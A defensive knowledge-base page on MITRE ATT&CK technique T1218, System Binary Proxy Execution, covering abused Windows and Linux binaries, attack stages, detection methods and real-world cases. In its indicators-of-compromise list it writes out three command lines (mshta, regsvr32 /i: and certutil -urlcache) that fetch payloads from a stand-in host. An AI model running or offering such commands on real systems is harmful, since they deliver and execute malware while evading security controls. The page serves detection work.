---
description: System Binary Proxy Execution [T1218]
icon: play
---

# System Binary Proxy Execution

## Information

* Name: System Binary Proxy Execution
* ID: T1218
* Tactics: [TA0005](../)
* Sub-Technique: [T1218.011](t1218.011.md), [T1218.013](t1218.013.md), [T1218.004](t1218.004.md), [T1218.007](t1218.007.md), [T1218.003](t1218.003.md), [T1218.002](t1218.002.md), T1218.015, [T1218.008](t1218.008.md), [T1218.012](t1218.012.md), [T1218.005](t1218.005.md), [T1218.001](t1218.001.md), [T1218.010](t1218.010.md), [T1218.009](t1218.009.md), [T1218.014](t1218.014.md)

## Introduction

System Binary Proxy Execution is a technique categorized under the MITRE ATT\&CK framework (Technique ID: T1218). Attackers utilize legitimate, pre-installed system binaries to execute malicious payloads or scripts, effectively bypassing security controls. These trusted binaries are typically signed and approved by the operating system, making them less suspicious to security tools and analysts. This method is particularly effective in evading detection and maintaining persistence within compromised environments.

## Deep Dive Into Technique

System Binary Proxy Execution leverages legitimate system utilities and binaries to execute malicious code, scripts, or payloads. Attackers exploit the inherent trust placed in these binaries, bypassing application whitelisting, antivirus solutions, and other security controls. Commonly abused binaries include, but are not limited to:

* **Windows:**
  * `mshta.exe`: Executes HTML Applications (.hta files), often used to execute malicious scripts.
  * `rundll32.exe`: Executes DLL files, allowing attackers to run malicious DLL payloads directly.
  * `regsvr32.exe`: Registers and executes DLL files; attackers frequently abuse it to execute malicious scripts hosted remotely.
  * `certutil.exe`: Downloads and decodes files from remote locations, useful for payload delivery.
  * `wmic.exe`: Executes commands remotely or locally, commonly used for lateral movement and execution.
  * `msiexec.exe`: Executes MSI installer packages, often used to deploy malicious payloads.
  * `InstallUtil.exe`: Executes .NET assemblies, providing attackers a stealthy method to execute malicious code.
* **Linux/Unix:**
  * `bash`: Executes shell scripts and commands, commonly leveraged in Linux environments.
  * `curl` and `wget`: Download payloads directly from remote servers, facilitating payload delivery and execution.
  * `python`, `perl`: Execute scripts directly, enabling attackers to run malicious code without additional binaries.

Attackers generally follow a structured approach:

1. **Reconnaissance**: Identify available system binaries and their potential for misuse.
2. **Payload Preparation**: Craft payloads or scripts compatible with the targeted binary.
3. **Delivery**: Deploy payloads through phishing, exploitation, or lateral movement.
4. **Execution**: Invoke system binaries to execute payloads, bypassing security mechanisms.
5. **Persistence and Evasion**: Utilize legitimate binaries to maintain presence and evade detection.

## When this Technique is Usually Used

System Binary Proxy Execution is commonly employed during various stages of cyber-attacks, including:

* **Initial Access**: Attackers execute malicious payloads delivered via phishing emails or web-based attacks using legitimate binaries.
* **Execution**: Malicious scripts or payloads are executed through trusted system binaries to bypass security controls.
* **Defense Evasion**: Attackers leverage trusted binaries to evade whitelisting and antivirus solutions, increasing stealth.
* **Persistence**: Legitimate binaries are used to persistently execute malicious payloads upon system reboot or user login.
* **Privilege Escalation**: Attackers may exploit binaries with elevated privileges to escalate their own privileges.
* **Lateral Movement**: Trusted system utilities, such as `wmic.exe` and `psexec.exe`, are used to execute commands remotely across networked systems.
* **Command and Control (C2)**: Attackers use legitimate binaries to establish covert communication channels with remote servers.

## How this Technique is Usually Detected

Detection of System Binary Proxy Execution requires monitoring and correlation of multiple indicators and behaviors, including:

* **Process Monitoring and Logging**:
  * Monitor command-line arguments and process creations involving commonly abused binaries (`mshta.exe`, `rundll32.exe`, `regsvr32.exe`, `certutil.exe`, etc.).
  * Identify unusual parent-child process relationships, particularly involving scripting engines or binaries executing from unusual locations.
* **Endpoint Detection and Response (EDR)**:
  * Utilize EDR solutions that provide visibility into process execution, file operations, and command-line activities.
  * Create behavioral rules and alerts for suspicious usage patterns of system binaries.
* **Application Whitelisting & Execution Control**:
  * Implement strict application control policies, restricting execution of scripts and binaries from unauthorized locations.
  * Regularly audit whitelisting rules and exceptions to identify potential abuse.
* **Network Traffic Analysis**:
  * Monitor network communications initiated by system binaries, especially those connecting to unknown or suspicious IP addresses and domains.
  * Detect unusual outbound HTTP/HTTPS connections initiated by binaries like `certutil.exe` or `mshta.exe`.
* **Indicators of Compromise (IoCs)**:
  * Suspicious command-line arguments, such as:
    * `mshta.exe http://malicious-domain.com/payload.hta`
    * `regsvr32.exe /s /n /u /i:http://malicious-domain.com/script.sct scrobj.dll`
    * `certutil.exe -urlcache -split -f http://malicious-domain.com/payload.exe payload.exe`
  * Unusual file downloads or decodings via system utilities.
  * Execution of binaries from temporary folders or unusual directories.

## Why it is Important to Detect This Technique

Early detection of System Binary Proxy Execution is critical due to several factors:

* **Stealth and Evasion**:
  * Attackers exploit trusted binaries to bypass security controls, making detection challenging and increasing the risk of prolonged compromise.
  * Failure to detect this technique allows attackers to maintain persistence, escalate privileges, and move laterally undetected.
* **Potential Damage and Impact**:
  * Undetected execution can lead to data exfiltration, ransomware deployment, espionage, or sabotage.
  * Attackers gain the ability to execute arbitrary commands and payloads, significantly increasing risks to organizational security and operational continuity.
* **Compliance and Regulatory Requirements**:
  * Organizations must detect and respond promptly to such threats to maintain compliance with industry standards and regulatory frameworks (e.g., GDPR, HIPAA, PCI DSS).
  * Failure to detect and remediate promptly can result in significant financial and reputational damages.
* **Incident Response and Containment**:
  * Early detection enables quicker incident response and containment, significantly reducing potential damage and recovery costs.
  * Understanding and detecting this technique enhances the organization's overall security posture and resilience against future threats.

## Examples

Real-world examples of System Binary Proxy Execution include:

* **APT32 (OceanLotus)**:
  * **Scenario**: Utilized `regsvr32.exe` to execute malicious scripts hosted remotely.
  * **Tools Used**: Remote SCT scripts, `regsvr32.exe`.
  * **Impact**: Espionage, data exfiltration, persistent access within targeted organizations.
* **FIN7**:
  * **Scenario**: Leveraged `mshta.exe` to execute malicious HTA payloads delivered via spear-phishing emails.
  * **Tools Used**: Malicious HTA files, `mshta.exe`.
  * **Impact**: Financial fraud, data breaches, significant financial losses for targeted organizations.
* **Emotet Malware**:
  * **Scenario**: Used `certutil.exe` to download and decode payloads from remote servers, bypassing traditional antivirus detection.
  * **Tools Used**: `certutil.exe`, encoded payloads.
  * **Impact**: Deployment of secondary malware (e.g., TrickBot, Ryuk ransomware), widespread financial and operational damage.
* **Cobalt Strike Framework**:
  * **Scenario**: Frequently utilized `rundll32.exe` and `regsvr32.exe` to execute beacon payloads and maintain persistence.
  * **Tools Used**: Cobalt Strike payloads, `rundll32.exe`, `regsvr32.exe`.
  * **Impact**: Persistent command-and-control channels, lateral movement, data exfiltration, privilege escalation.
* **Lazarus Group**:
  * **Scenario**: Abused `InstallUtil.exe` to execute malicious .NET payloads, bypassing security controls.
  * **Tools Used**: Malicious .NET assemblies, `InstallUtil.exe`.
  * **Impact**: Espionage, financial theft, sabotage, and prolonged undetected presence within victim networks.
